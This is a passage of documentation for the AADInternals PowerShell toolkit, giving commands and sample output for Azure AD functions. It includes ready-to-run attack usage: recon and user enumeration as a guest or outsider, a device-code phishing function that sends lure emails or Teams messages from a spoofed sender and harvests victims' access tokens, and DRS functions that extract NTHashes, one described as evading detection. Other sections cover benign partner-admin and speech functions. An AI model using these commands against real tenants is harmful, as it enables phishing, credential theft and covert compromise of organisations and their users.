Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache -Tenant 6e3846ee-e8ca-4609-a3ab-f405cfbd02cd

# Invoke tenant recon as guest
$results = Invoke-AADIntReconAsGuest
{{< /highlight>}}
**Output:**
```
Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
```
{{< highlight powershell >}}
# Show users allowed actions
$results.allowedActions
{{< /highlight>}}
**Output:**
```
application      : {read}
domain           : {read}
group            : {read}
serviceprincipal : {read}
tenantdetail     : {read}
user             : {read, update}
serviceaction    : {consent}
```

### Invoke-AADIntUserEnumerationAsGuest (AC)
Since version 0.4.0 <br>

Crawls the target organisation for user names, groups, and roles. The starting point is the signed-in user, a given username, or a group id.

The crawl can be controlled with switches. Group members are limited to 1000 entries per group.

Switch        | Description
--- | ---
Groups        | Include user's groups
GroupMembers  | Include members of user's groups
Roles         | Include roles of user and group members. Can be very time consuming!
Manager       | Include user's manager
Subordinates  | Include user's subordinates (direct reports)

Parameters:

Parameter | Description
 --- | ---
UserName  | User principal name (UPN) of the user to search. If not given, the user name from the access token is used and treated as external (email_domain#EXT#@company.onmicrosoft.com)
GroupId   | Id of the group. If this is given, only the members of the group are included.

**Example:**
{{< highlight powershell >}}
# Invoke user enumeration as a guest
$results = Invoke-AADIntUserEnumerationAsGuest -UserName "user@company.com"
{{< /highlight>}}

**Output:**
```
Tenant brand: Company Ltd
Tenant name:  company.onmicrosoft.com
Tenant id:    6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Logged in as: live.com#user@outlook.com
Users:        5
Groups:       2
Roles:        0
```

**Example 2:**
{{< highlight powershell >}}
# Invoke user enumeration as an outsider using a text file
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider
{{< /highlight>}}

**Output:**
```
UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
external.user_gmail.com#EXT#@company.onmicrosoft.com   True
external.user_outlook.com#EXT#@company.onmicrosoft.com False
```

### Invoke-AADIntReconAsInsider (AC)
Since version 0.4.0 <br>

Starts tenant recon of Azure AD tenant. 

**Example 1:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Invoke tenant recon as guest
$results = Invoke-AADIntReconAsInsider
{{< /highlight>}}

**Output:**
```
Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
Directory sync enabled?      true
Global admins                3
```
{{< highlight powershell >}}
# List all admin roles that have members
$results.roleInformation | Where Members -ne $null | select Name,Members
{{< /highlight>}}
**Output:**
```
Name                               Members                                                                                       
----                               -------                                                                                       
Company Administrator              {@{DisplayName=MOD Administrator; UserPrincipalName=admin@company.onmicrosoft.com}, @{D...
User Account Administrator         @{DisplayName=User Admin; UserPrincipalName=useradmin@company.com}                   
Directory Readers                  {@{DisplayName=Microsoft.Azure.SyncFabric; UserPrincipalName=}, @{DisplayName=MicrosoftAzur...
Directory Synchronization Accounts {@{DisplayName=On-Premises Directory Synchronization Service Account; UserPrincipalName=Syn...
```

### Invoke-AADIntUserEnumerationAsInsider (AC)
Since version 0.4.0 <br>

Dumps user names and groups of the tenant.

By default, the first 1000 users and groups are returned. 

Switch        | Description
--- | ---
Groups        | Include groups
GroupMembers  | Include members of the groups (not recommended)


Parameters:

Parameter | Description
 --- | ---
GroupId   | Id of the group. Id of the group. If this is given, only one group and members are included.

**Example:**
{{< highlight powershell >}}
# Invoke user enumeration as a insider
$results = Invoke-AADIntUserEnumerationAsInsider
{{< /highlight>}}

**Output:**
```
Users:        5542
Groups:        212
```
{{< highlight powershell >}}
# List the first user's information
$results.Users[0]
{{< /highlight>}}

**Output:**
```
id                              : 7ab0eb51-b7cb-4ff0-84ec-893a413d7b4a
displayName                     : User Demo
userPrincipalName               : User@company.com
onPremisesImmutableId           : UQ989+t6fEq9/0ogYtt1pA==
onPremisesLastSyncDateTime      : 2020-07-14T08:18:47Z
onPremisesSamAccountName        : UserD
onPremisesSecurityIdentifier    : S-1-5-21-854168551-3279074086-2022502410-1104
refreshTokensValidFromDateTime  : 2019-07-14T08:21:35Z
signInSessionsValidFromDateTime : 2019-07-14T08:21:35Z
proxyAddresses                  : {smtp:User@company.onmicrosoft.com, SMTP:User@company.com}
businessPhones                  : {+1234567890}
identities                      : {@{signInType=userPrincipalName; issuer=company.onmicrosoft.com; issuerAssignedId=User@company.com}} 
```

### Invoke-AADIntPhishing
Since version 0.4.4 <br>

Sends phishing mail to given recipients and receives user's access token using <a href="/post/phishing" target="_blank">device code authentication</a> flow.

The sent message is an html message. Uses string formatting to insert url and user code:

Placeholder | Value
---         | ---
{0}         | user code
{1}         | signing url

Default message:
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
Email:<br>
![Phishing email](/images/posts/phishing_11.png)

Teams:<br>
![Phishing message](/images/posts/phishing_12.png)

**Example1:**
{{< highlight powershell >}}
# Send a phishing email to a recipient using the default message
$tokens = Invoke-AADPhishing -Recipients "wvictim@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local
{{< /highlight>}}

**Output1:**
```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```

**Example2:**
{{< highlight powershell >}}
# Get access token for teams
Get-AADIntAccessTokenForTeams -SaveToCache

# Send a teams message to a recipient using the default message
$tokens = Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams
{{< /highlight>}}

**Output2:**
```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```

**Example3:**
{{< highlight powershell >}}
# Send a phishing email to recipients using a customised message and save the tokens to cache
Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message '<html>Hi!<br>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>' -SaveToCache 
{{< /highlight>}}

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
Mail sent to: wvictim2@company.com
...
Received access token for william.victim@company.com
```
{{< highlight powershell >}}
# Invoke the recon as an insider
$results = Invoke-AADIntReconAsInsider
{{< /highlight>}}

**Output3:**
```
Tenant brand:                company.com
Tenant name:                 company.onmicrosoft.com
Tenant id:                   d4e225d6-8877-4bc6-b68c-52c44011ba81
Azure AD objects:            147960/300000
Domains:                     5 (5 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
Directory sync enabled?      true
Global admins                10
```

## DRS functions

### Get-AADIntAdUserNTHash (*)
Since version 0.4.7 <br>

Gets NTHash for the given object ID using Directory Replication Service (DRS).

**Example:**
{{< highlight powershell >}}
# Get the credentials with replication rights
$cred = Get-Credential

# Get the photo
$NTHash = Get-AADIntAdUserNTHash -ObjectGuid 36f71b0f-9963-48e9-8efa-9441f54ed1a4 -Credentials $cred -Server "dc.company.com"
{{< /highlight>}}

### Get-AADIntADUserThumbnailPhoto (*)
Since version 0.4.7 <br>

Gets thumbnailPhoto for the given object ID using Directory Replication Service (DRS). 
Can be used to access ADFS KDS container without detection.

**Example:**
{{< highlight powershell >}}
# Get the credentials with replication rights
$cred = Get-Credential

# Get the photo
$photo = Get-AADIntADUserThumbnailPhoto -ObjectGuid 36f71b0f-9963-48e9-8efa-9441f54ed1a4 -Credentials $cred -Server "dc.company.com"
{{< /highlight>}}

### Get-AADIntDesktopSSOAccountPassword (*)
Since version 0.4.7 <br>

Gets NTHash of Desktop SSO account using Directory Replication Service (DRS).

**Example:**
{{< highlight powershell >}}
# Get the credentials with replication rights
$cred = Get-Credential

# Get the photo
$NTHash = Get-AADIntDesktopSSOAccountPassword -Credentials $cred -Server "dc.company.com"
{{< /highlight>}}

## MS Partner functions

### New-AADIntMSPartnerDelegatedAdminRequest (*)
Since version 0.6.5 <br>

Creates a new delegated admin request for the given MS partner organisation.

The returned url can be used by customers to accept the partner request.

**Example 1:**
{{< highlight powershell >}}

# Create the delegated admin request for the given partner domain
New-AADIntMSPartnerDelegatedAdminRequest -Domain company.com
{{< /highlight>}}

**Output:**
```
https://admin.microsoft.com/Adminportal/Home?invType=Administration&partnerId=c7e52a77-e461-4f2e-a652-573305414be9#/BillingAccounts/partner-invitation
```

**Example 2:**
{{< highlight powershell >}}
# Create the delegated admin request for the given partner tenant
New-AADIntMSPartnerDelegatedAdminRequest -TenantId c7e52a77-e461-4f2e-a652-573305414be9
{{< /highlight>}}

**Output:**
```
https://admin.microsoft.com/Adminportal/Home?invType=Administration&partnerId=c7e52a77-e461-4f2e-a652-573305414be9#/BillingAccounts/partner-invitation
```

### Approve-AADIntMSPartnerDelegatedAdminRequest (AD)
Since version 0.6.5 <br>

Assigns Delegated Admin Permissions (DAP) for the given partner organisation. Requires Global Admin permissions.

**Example 1:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# Assign DAP for the given partner
Approve-AADIntMSPartnerDelegatedAdminRequest -Domain company.com
{{< /highlight>}}

**Output:**
```
responseCode message
------------ -------
success 
```

**Example 2:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# Assign DAP for the given partner
Approve-AADIntMSPartnerDelegatedAdminRequest -TenantId c7e52a77-e461-4f2e-a652-573305414be9
{{< /highlight>}}

**Output:**
```
responseCode message
------------ -------
success 
```

### Remove-AADIntMSPartnerDelegatedAdminRoles (AD)
Since version 0.6.5 <br>

Removes Delegated Admin Permissions (DAP) from the given partner organisation. Requires Global Admin permissions.

**Example 1:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# Remove DAP from the given partner
Remove-AADIntMSPartnerDelegatedAdminRoles -Domain company.com
{{< /highlight>}}

**Output:**
```
responseCode message
------------ -------
success 
```

**Example 2:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# Remove DAP from the given partner
Remove-AADIntMSPartnerDelegatedAdminRoles -TenantId c7e52a77-e461-4f2e-a652-573305414be9
{{< /highlight>}}

**Output:**
```
responseCode message
------------ -------
success 
```

### Get-AADIntMSPartners (AD)
Since version 0.6.5 <br>

Shows organisation's partners using Admin API. Requires permissions to Microsoft 365 admin center.

**Example:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAdmin -SaveToCache

# List the partners
Get-AADIntMSPartners
{{< /highlight>}}

**Output:**
```
Identity         : b1f6d5cc-f1d3-41d9-b88c-1d177aaf171b
DisplayName      : Partner Ltd
Email            : pmanager@company.com
Website          : http://www.company.com
Phone            : +1234567890
Relationship     : Indirect Reseller and Admin
TypeDetail       : PartnerAdmin
CanDelete        : False
CanRemoveDap     : True
AllDataRetrieved : True
```

### Get-AADIntMSPartnerOrganizations (MP)
Since version 0.6.5 <br>

Lists partner organisations of the logged in user. Does not require permissions to MS Partner Center.

**Example:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForMSPartner -SaveToCache

# List the partner organisations
Get-AADIntMSPartnerOrganizations
{{< /highlight>}}

**Output:**
```
id             : 9a0c7346-f305-4646-b3fb-772853f6b209
typeName       : Tenant
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 60a0020f-bd16-4f27-a23c-104644918834
typeName       : PartnerGlobal
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559542
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 297588a4-5c2a-430e-ae1e-b16c5d944a7d
typeName       : PartnerLocation
name           : Partner Ltd, US, PARTNERVILLE
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}
```

### Get-AADIntMSPartnerRoleMembers (MP)
Since version 0.6.5 <br>

Lists MS Partner roles and their members. Does not require permissions to MS Partner Center.

**Example:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForMSPartner -SaveToCache

# List the partner roles and members
Get-AADIntMSPartnerRoleMembers 
{{< /highlight>}}

**Output:**
```
Id                                   Name                            Members                                          
--                                   ----                            -------                                          
0e7f236d-a3d8-458a-bd49-eaf200d12cd5 Admin Agent                     {@{displayName=Admin; userPrincipalNa...
082cc3a5-2eff-4274-8fe1-ad5b4387ef55 Helpdesk Agent                  {@{displayName=User; userPrincipalN...                                                 
6b07cbb3-16e4-453a-82f4-7a4310c21bc9 MPN Partner Administrator       @{displayName=User 1; userPrincipalN...
e760e836-1c2d-47d2-9dee-92131ce57878 Report Viewer                                                                    
9ac2b88b-6fad-416c-b849-433f8090de68 Executive Report Viewer         @{displayName=User 2; userPrincipalN...
B53FEC78-7449-4A46-A071-C8BEF4A45134 Account Admin                                                                    
8d3c7e52-447f-4cfd-9b50-1e4dd00495b7 Cosell Solution Admin                                                            
0a28a37c-ec3a-462a-a87b-c409abbdba68 Incentive Administrator                                                          
f712b351-0d8f-4051-a374-0abab5a49b5b Incentive User                                                                   
140c97a7-ab21-4c2f-8f3b-9086898de0d5 Incentive Readonly User                                                          
3d8005f3-1d34-4191-9969-b6da64b83777 Marketing Content Administrator                                                  
4b38bcd9-a505-445b-af32-06c05aaeddd7 Referrals Administrator                                                          
2d9bb971-5414-4bc7-a826-079da1fa0c93 Referrals User   
```

### Get-AADIntMSPartnerContracts (A)
Since version 0.6.5 <br>

Lists partner's customer organisations using provisioning API. Does not require permissions to MS Partner Center or admin rights.

**Example:**
{{< highlight powershell >}}
# Get access token and save to cache
Get-AADIntAccessTokenForAADGraph -SaveToCache 

# List the partner's customer organisations
Get-AADIntMSPartnerContracts
{{< /highlight>}}

**Output:**
```
CustomerName     CustomerTenantId                     CustomerDefaultDomain   ContractType           
------------     ----------------                     ---------------------   ------------           
Company          dad33f16-69d1-4e32-880e-9c2d21aa3e59 company.com             SupportPartnerContract 
Contoso          936b7883-4746-4b89-8bc4-c8128795cd7f contoso.onmicrosoft.com ResellerPartnerContract
Adatum           17427dcd-8d61-4c23-9c68-d1f34975b420 adatum.com              SupportPartnerContract 
```

### Find-AADIntMSPartners
Since version 0.6.6 <br>

Finds MS Partners using the given criteria. 

**Example:**
{{< highlight powershell >}}
# Find the first 20 partners from Finland
Find-AADIntMSPartners -Country FI -MaxResults 20 | Sort CompanyName
{{< /highlight>}}

**Output:**
```
Estimated total matches: 511

TenantId                             CompanyName               Country Address                                       
--------                             -----------               ------- -------                                       
6f28e5b8-67fe-4207-a048-cc17b8e13499 Addend Analytics LLP      FI      @{country=FI; region=Europe; city=Espoo; st...
12f4ed76-f694-4b1e-9b57-c3849eea3f6c CANORAMA OY AB            FI      @{country=FI; region=Europe; city=Kokkola; ...
4521e161-50d6-4596-a921-2783741fda32 Cloud2 Oy                 FI      @{country=FI; region=Europe; city=Helsinki;...
bff3224c-767a-4628-8c53-23a4df13a03c CloudNow IT Oy            FI      @{country=FI; region=Europe; city=Espoo; ad...
719dc930-9d0e-4ea4-b53e-a2c65a625979 Cloudriven Oy             FI      @{country=FI; region=Europe; city=Helsinki;...
6f1ff46b-bd45-422f-ad28-485c03cd59fc Cubiq Analytics Oy        FI      @{country=FI; region=Europe; city=Helsinki;...
6fce4bb8-3501-41c9-afcc-db0fb51c7e3d Digia                     FI      @{country=FI; region=Europe; city=Tampere; ...
b3233d42-4a7e-441a-b94c-8fc0ff30af40 Etteplan MORE Oy          FI      @{country=FI; region=Europe; city=Helsinki;...
87fc9aba-de47-425e-b0ac-712471cbb34f Fujitsu Limited           FI      @{country=FI; region=Europe; city=Helsinki;...
4b4e036d-f94b-4209-8f07-6860b3641366 Gofore Oyj                FI      @{country=FI; region=Europe; city=Helsinki;...
4eee4718-7215-41bf-b130-25ce43c85b33 Henson Group              FI      @{country=FI; region=Europe; city=Tampere; ...
7c0c36f5-af83-4c24-8844-9962e0163719 Hexaware Technologies     FI      @{country=FI; region=Europe; city=Helsinki;...
99ebba89-0dd9-4b7b-8f23-95339d2a81e1 IBM                       FI      @{country=FI; region=Europe; city=Helsinki;...
1c8672ad-d9cc-4f59-b839-90be132d96ab IFI Techsolutions Pvt Ltd FI      @{country=FI; region=Europe; city=Finland; ...
1e3ee4c0-94a9-45a4-9151-07e1858e6372 InlineMarket Oy           FI      @{country=FI; region=Europe; city=Helsinki;...
431fbbea-8544-49f8-9891-e8a4e4756e83 Medha Hosting (OPC) Ltd   FI      @{country=FI; region=Europe; city=Helsinki;...
04207efa-4522-4391-a621-5708a40b634d MPY Yrityspalvelut Oyj    FI      @{country=FI; region=Europe; city=Kuopio; a...
8c467c92-8e59-426e-a612-e23d69cb4437 Myriad Technologies       FI      @{country=FI; region=Europe; city=Helsinki;...
50950a2d-dde4-4887-978d-630468d7f741 Solteq Plc                FI      @{country=FI; region=Europe; city=Jyväskylä...
eab8b88b-cf1a-441a-9ad9-6a8d94dcccbb Solu Digital Oy           FI      @{country=FI; region=Europe; city=ESPOO; ad...
```


## OneNote functions

### Start-AADIntSpeech (ON)
Since version 0.6.7 <br>

Gets mp3 stream of the given text using learning tools API and plays it with Media player.

The returned url can be used by customers to accept the partner request.

**Example:**
{{< highlight powershell >}}
# Get access token and store to cache
Get-AADIntAccessTokenForOneNote -SaveToCache

# Play the audio
Start-AADIntSpeech -Text "Three Swedish switched witches watch three Swiss Swatch watch switches. Which Swedish switched witch watch which Swiss Swatch watch switch?" -Language "en-GB" -PreferredVoice Male
{{< /highlight>}}

## Certificate Based Authentication (CBA)

Proof-of-concept functions to get access tokens using CBA.

### Get-AADIntAdminPortalAccessTokenUsingCBA
Since version 0.6.9 <br>

Gets Access Tokens using Certificate Based Authentication (CBA). Returns tokens for Portal and Business Store. Assumes that CN of the given certificate contains upn with domain name.

{{< highlight powershell >}}
# Get tokens
$tokens = Get-AADIntAdminPortalAccessTokenUsingCBA -PfxFileName .\my_cert.pfx -PfxPassword "my supersecret password"
{{< /highlight>}}
```
Logged in as user@company.com
```
{{< highlight powershell >}}
# Show the token information
Read-AADIntAccesstoken $tokens[0] | Select aud,iss,appid,amr | fl
{{< /highlight>}}
```
aud   : https://portal.office.com/
iss   : https://sts.windows.net/25dc721a-d37f-44ec-b8dc-cc5783e9ec56/
appid : 00000006-0000-0ff1-ce00-000000000000
amr   : {rsa, mfa}
```

### Get-AADIntPortalAccessTokenUsingCBA
Since version 0.6.9 <br>

Gets Access Tokens using Certificate Based Authentication (CBA). 
Returns tokens for Graph, Office search, Substrate, Loki, and Portal
Assumes that CN of the given certificate contains upn with domain name.

{{< highlight powershell >}}
# Get tokens
$tokens = Get-AADIntPortalAccessTokenUsingCBA -PfxFileName .\my_cert.pfx -PfxPassword "my supersecret password"
{{< /highlight>}}
```
Logged in as user@company.com
```
{{< highlight powershell >}}
# Show the token information
Read-AADIntAccesstoken $tokens[0] | Select aud,iss,appid,amr | fl
{{< /highlight>}}
```
aud   : https://graph.microsoft.com
iss   : https://sts.windows.net/25dc721a-d37f-44ec-b8dc-cc5783e9ec56/
appid : 4765445b-32c6-49b0-83e6-1d93765276ca
amr   : {rsa, mfa}
```